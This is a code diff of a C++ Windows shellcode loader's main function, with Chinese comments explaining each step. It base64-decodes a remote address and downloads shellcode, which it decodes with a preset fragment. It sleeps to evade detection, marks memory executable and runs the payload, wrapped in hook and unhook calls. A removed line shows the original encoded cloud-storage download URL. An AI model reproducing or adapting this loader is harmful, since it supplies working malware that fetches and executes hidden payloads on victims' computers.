@@ -133,31 +133,19 @@ int main()
 	hEvent = CreateEvent(NULL, TRUE, false, NULL);
 
 	AddVectoredExceptionHandler(1, &FirstVectExcepHandler);
-	aaa();
+	aaa(); //hook
 	HANDLE hThread1 = CreateThread(NULL, 0, bsmmm, NULL, 0, NULL);
 	CloseHandle(hThread1);
 
-
-
-	unsigned char* BinData = NULL;
-	size_t size = 0;
-	std::string a = "aHR0cDovL2VsaW5rLXN0Zy5vc3MtY24tc2hlbnpoZW4uYWxpeXVuY3MuY29tLzIwMjIvYWFhLmljbw==";
+	std::string a = ""; //shellcoede 远程地址 （内容，地址均base64编码,内容不完全预设了一部分到ReadBase64）
 	std::string b;
-	b = base64_decode2(a);
-	//printf(b.c_str());
+	b = base64_decode2(a); //解码 下载地址
 
 	const char* HTTP = b.c_str();
-	pData = HttpReceive(HTTP, dataSize);
+	pData = HttpReceive(HTTP, dataSize); //下载shellcode
 	
 	
-	/*printf(pData);
-	FILE* f;
-	fopen_s(&f, "logs.data", "wb");
-	fwrite(pData, dataSize, 1, f);
-	fclose(f);*/
-	//char* szFilePath = "1.bin";
-	//BinData = ReadBinaryFile(pData, &size);
-	pData = (char*)ReadBase64(pData, dataSize);
+	pData = (char*)ReadBase64(pData, dataSize); //shellcode 解密（加上预设的一部分shellcode）
 	Sleep(10000);
 	bsssscc = VirtualAlloc(NULL, dataSize, MEM_COMMIT, PAGE_READWRITE);
 	Sleep(10000);
@@ -166,7 +154,7 @@ int main()
 	VirtualProtect(bsssscc, dataSize, PAGE_EXECUTE_READWRITE, &bmadf);
 	(*(int(*)()) bsssscc)();
 
-	bbb();
+	bbb();//unhook
 
 	return 0;
 }
